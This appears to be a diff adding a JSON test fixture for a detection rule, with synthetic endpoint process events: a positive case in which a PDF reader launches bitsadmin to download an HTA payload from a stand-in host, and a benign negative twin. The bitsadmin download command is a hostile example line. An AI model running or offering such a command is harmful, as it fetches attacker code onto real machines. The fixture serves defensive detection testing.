@@ -1,0 +1,110 @@
+{
+  "rule": {
+    "source": "prebuilt",
+    "rule_id": "53a26770-9cbd-40c5-8b57-61d01a325e14"
+  },
+  "chain": "bits-mshta",
+  "step": "PDF reader -> bitsadmin",
+  "positive": {
+    "docs": [
+      {
+        "stream": "logs-endpoint.events.process",
+        "at": -120,
+        "doc": {
+          "event": {
+            "category": [
+              "process"
+            ],
+            "type": [
+              "start"
+            ],
+            "action": "start",
+            "kind": "event"
+          },
+          "host": {
+            "name": "wks-jordan-04",
+            "id": "azqa-wks-jordan-04",
+            "os": {
+              "type": "windows",
+              "family": "windows"
+            },
+            "hostname": "wks-jordan-04"
+          },
+          "user": {
+            "name": "jordan.park",
+            "domain": "CORP",
+            "id": "S-1-5-21-1111-2222-3333-1105"
+          },
+          "process": {
+            "name": "bitsadmin.exe",
+            "executable": "C:\\Windows\\System32\\bitsadmin.exe",
+            "command_line": "bitsadmin /transfer updater https://payload-cdn.example.net/a.hta C:\\ProgramData\\a.hta",
+            "args": [
+              "bitsadmin",
+              "/transfer",
+              "updater",
+              "https://payload-cdn.example.net/a.hta",
+              "C:\\ProgramData\\a.hta"
+            ],
+            "entity_id": "azqa-bitsadmin.exe-71841",
+            "parent": {
+              "name": "AcroRd32.exe",
+              "executable": "C:\\Windows\\System32\\AcroRd32.exe",
+              "entity_id": "azqa-AcroRd32.exe-912630"
+            }
+          }
+        }
+      }
+    ]
+  },
+  "negative": {
+    "twin_delta": "Reader spawns its own helper process (AcroCEF.exe), not a LOLBin",
+    "docs": [
+      {
+        "stream": "logs-endpoint.events.process",
+        "at": -120,
+        "doc": {
+          "event": {
+            "category": [
+              "process"
+            ],
+            "type": [
+              "start"
+            ],
+            "action": "start",
+            "kind": "event"
+          },
+          "host": {
+            "name": "wks-jordan-04",
+            "id": "azqa-wks-jordan-04",
+            "os": {
+              "type": "windows",
+              "family": "windows"
+            },
+            "hostname": "wks-jordan-04"
+          },
+          "user": {
+            "name": "jordan.park",
+            "domain": "CORP",
+            "id": "S-1-5-21-1111-2222-3333-1105"
+          },
+          "process": {
+            "name": "AcroCEF.exe",
+            "executable": "C:\\Windows\\System32\\AcroCEF.exe",
+            "command_line": "AcroCEF.exe --type=renderer",
+            "args": [
+              "AcroCEF.exe",
+              "--type=renderer"
+            ],
+            "entity_id": "azqa-AcroCEF.exe-605013",
+            "parent": {
+              "name": "AcroRd32.exe",
+              "executable": "C:\\Windows\\System32\\AcroRd32.exe",
+              "entity_id": "azqa-AcroRd32.exe-912630"
+            }
+          }
+        }
+      }
+    ]
+  }
+}
